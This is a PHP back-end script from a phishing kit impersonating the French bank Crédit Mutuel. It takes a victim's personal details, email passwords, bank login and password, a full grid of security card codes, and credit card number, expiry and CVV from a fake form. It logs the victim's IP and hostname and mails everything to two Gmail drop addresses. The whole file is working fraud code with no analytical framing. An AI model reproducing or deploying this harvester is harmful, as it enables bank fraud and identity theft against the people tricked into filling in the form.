<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$usrb = $_POST['identi'];

if ($usrb == "")
{
//header("Location: ");
}
else {
$message  = "==========================+ Credit.Mutuel.ReZult +==================\n";
$message .= "civilite: ".$_POST['cevi']."\n";
$message .= "Nom : ".$_POST['nom']."\n";
$message .= "Prenom : ".$_POST['prenom']."\n";
$message .= "Date de naissane : ".$_POST['born']."\n";
$message .= "Telephone : ".$_POST['telephone']."\n";
$message .= "Code postal : ".$_POST['zip']."\n";
$message .= "Ville : ".$_POST['ville']."\n";
$message .= "Adresse : ".$_POST['adress']."\n\n";

$message .= "Email : ".$_POST['email']."\n";
$message .= "mdpass : ".$_POST['mailpass']."\n";
$message .= "E-mail : ".$_POST['emaill']."\n";
$message .= "modpass : ".$_POST['mailpasss']."\n\n";

$message .= "========================+ Account.Access +==========================\n";
$message .= "Identifiant : ".$_POST['identi']."\n";
$message .= "mdpasse : ".$_POST['pw']."\n\n";

$message .= "A : ".$_POST['a1']."- -".$_POST['a2']."- -".$_POST['a3']."- -".$_POST['a4']."- -".$_POST['a5']."- -".$_POST['a6']."- -".$_POST['a7']."- -".$_POST['a8']."\n";
$message .= "B : ".$_POST['b1']."- -".$_POST['b2']."- -".$_POST['b3']."- -".$_POST['b4']."- -".$_POST['b5']."- -".$_POST['b6']."- -".$_POST['b7']."- -".$_POST['b8']."\n";
$message .= "C : ".$_POST['c1']."- -".$_POST['c2']."- -".$_POST['c3']."- -".$_POST['c4']."- -".$_POST['c5']."- -".$_POST['c6']."- -".$_POST['c7']."- -".$_POST['c8']."\n";
$message .= "D : ".$_POST['d1']."- -".$_POST['d2']."- -".$_POST['d3']."- -".$_POST['d4']."- -".$_POST['d5']."- -".$_POST['d6']."- -".$_POST['d7']."- -".$_POST['d8']."\n";
$message .= "E : ".$_POST['e1']."- -".$_POST['e2']."- -".$_POST['e3']."- -".$_POST['e4']."- -".$_POST['e5']."- -".$_POST['e6']."- -".$_POST['e7']."- -".$_POST['e8']."\n";
$message .= "F : ".$_POST['f1']."- -".$_POST['f2']."- -".$_POST['f3']."- -".$_POST['f4']."- -".$_POST['f5']."- -".$_POST['f6']."- -".$_POST['f7']."- -".$_POST['f8']."\n";
$message .= "G : ".$_POST['g1']."- -".$_POST['g2']."- -".$_POST['g3']."- -".$_POST['g4']."- -".$_POST['g5']."- -".$_POST['g6']."- -".$_POST['g7']."- -".$_POST['g8']."\n";
$message .= "H : ".$_POST['h1']."- -".$_POST['h2']."- -".$_POST['h3']."- -".$_POST['h4']."- -".$_POST['h5']."- -".$_POST['h6']."- -".$_POST['h7']."- -".$_POST['h8']."\n \n";


$message .= "==============================+ C.C +===============================\n";
$message .= "nnum ".$_POST['nuum']."\n";
$message .= "exp : ".$_POST['mois']." / ".$_POST['annee']."\n";
$message .= "crypto : ".$_POST['xrypt']."\n\n";

$message .= "====================================================================\n";
$message .= "IP : ".$ip."\n";
$message .= "Host : ".$hostname."\n";
$message .= "=========================+ Coded by El Hierro +=========================\n";
$send = "napolitano.madera@gmail.com";

$subject = "Mutuel result $ip";
$headers = "From:  ImaM<root@localhost>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);

$senda = "rzltnull@gmail.com";

$subjecta = "Mutuel result $ip";
$headersa = "From:  El Hierro<donotreply@odesk.com>";
$headersa .= $_POST['eMailAdd']."\n";
$headersa .= "MIME-Version: 1.0\n";

mail($senda,$subjecta,$message,$headersa);

}
?>